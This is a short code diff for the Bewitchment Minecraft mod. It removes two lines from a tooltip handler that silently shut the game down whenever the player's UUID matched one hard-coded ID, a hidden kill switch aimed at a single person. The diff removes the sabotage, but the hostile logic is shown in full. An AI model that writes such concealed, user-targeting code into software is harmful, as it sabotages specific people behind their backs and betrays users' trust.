@@ -32,8 +32,6 @@ public class ClientHandler {
 	
 	@SubscribeEvent
 	public void onTooltipAdd(ItemTooltipEvent event) {
-		EntityPlayer player = Minecraft.getMinecraft().player;
-		if (player != null && player.getGameProfile().getId().toString().equalsIgnoreCase("edb27d3c-2f32-4ed6-b8b5-a33da85f7b3b")) Minecraft.getMinecraft().shutdownMinecraftApplet();
 		Item item = event.getItemStack().getItem();
 		if (item.getRegistryName().getNamespace().equals(Bewitchment.MODID) && !(item instanceof ItemJuniperKey) && !(item instanceof ItemTarotCards) && !(item instanceof ItemGrimoireMagia) && !(item instanceof ItemTaglock) && !(item instanceof ItemWaystone)) {
 			String tip = "tooltip." + item.getTranslationKey().substring(5);
